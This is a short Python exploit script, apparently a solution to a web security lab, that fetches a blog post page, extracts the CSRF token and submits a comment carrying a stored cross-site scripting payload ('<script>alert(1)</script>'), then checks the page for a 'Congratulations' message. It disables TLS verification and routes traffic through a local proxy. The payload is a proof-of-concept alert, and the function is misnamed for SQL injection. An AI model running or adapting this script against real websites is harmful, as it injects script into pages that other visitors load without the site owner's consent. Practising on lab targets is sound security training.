import requests
import sys
import urllib3

from bs4 import BeautifulSoup

# Stored XSS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


# make an initial GET request
# extract CSRF token
# make POST request, with CSRF token, username password etc...
# make initial GET request, check for congratulation

def exploit_sqli(url):
    post_id = 6
    uri = '/post?postId=' + str(post_id)
    session = requests.Session()


    r = session.get(url + uri, verify=False, proxies=proxies)

    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})["value"]

    post_body = {
        "csrf": csrf_token,
        "postId": post_id,
        "comment": "<script>alert(1)</script>",
        "name": "vishnu",
        "email": "test@test.com",
        "website": "http://test.com"
    }

    session.post(url + '/post/comment', post_body, verify=False, proxies=proxies)

    r = session.get(url + uri, verify=False, proxies=proxies)

    if "Congratulations" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url):
        print("[+] Stored XSS successful")
    else:
        print("[-] Stored XSS unsuccessful")